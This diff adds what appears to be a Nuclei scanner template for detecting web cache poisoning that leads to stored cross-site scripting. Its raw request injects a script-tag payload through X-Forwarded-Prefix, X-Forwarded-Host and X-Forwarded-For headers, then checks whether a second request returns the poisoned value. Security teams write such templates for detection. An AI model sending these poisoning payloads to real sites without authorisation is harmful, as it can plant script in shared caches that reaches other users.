@@ -1,0 +1,25 @@
+id: cache-poisoning-xss
+
+info:
+  name: Cache Poisoning Based Stored XSS
+  author: melbadry9,xelkomy,akincibor
+  severity: high
+  reference:
+    - https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning
+    - https://portswigger.net/research/practical-web-cache-poisoning
+  tags: cache,generic
+
+requests:
+  - raw:
+      - |
+        GET /?test=1337 HTTP/1.1
+        X-Forwarded-Prefix: cache.example.com"></script><script>alert(document.domain);</script>
+        X-Forwarded-Host: cache.example.com"></script><script>alert(document.domain);</script>
+        X-Forwarded-For: cache.example.com"></script><script>alert(document.domain);</script>
+      - |
+        GET /?test=1337 HTTP/1.1
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "cache.example.com")'
